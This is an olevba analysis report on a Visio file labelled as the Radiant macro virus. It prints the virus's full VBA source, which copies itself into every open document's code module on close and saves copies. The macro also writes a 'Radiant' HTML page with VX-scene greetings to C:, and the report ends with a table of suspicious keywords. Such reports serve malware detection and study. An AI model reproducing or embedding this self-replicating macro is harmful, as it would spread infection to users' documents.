olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSVisio.Radiant-903843ff174787e868732d53224f57c0aa2d16a1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSVisio.Radiant-903843ff174787e868732d53224f57c0aa2d16a1 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_BeforeDocumentClose(ByVal doc As Visio.IVDocument)
On Error Resume Next
Set rnt = ThisDocument.VBProject.VBComponents(1).CodeModule
For i = 1 To Documents.Count
    Set docobj = Documents.Item(i)
Set gets = docobj.VBProject.VBComponents(1).CodeModule
If gets.lines(14, 1) <> "Next i" Then
gets.deletelines 1, gets.countoflines
gets.insertlines 1, rnt.lines(1, rnt.countoflines)
dname = CurDir & "\"
fila$ = (dname & docobj & ".vsd")
ThisDocument.SaveAsEx fila$, visSaveAsWS = 2
End If
Next i
Open "c:\index.html" For Output As 1
Print #1, "<html><head><title>Radiant</title></head><body><center> "
Print #1, "A Multitude of Suns<br>": Print #1, "Orbit in Empty Space;<br>"
Print #1, "They Speak with their light<br>": Print #1, "to all that is dark.<br>"
Print #1, "To me they remain silent.<br>": Print #1, "<p><p>Greets to all the VX Community<br>"
Print #1, "And Radiant Angels<br><p>": Print #1, "<br>its......<h1>Radiant</h1><br></html>"
Close 1
'Aþä°ä¹*sÈÄqÆw…û
Q
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

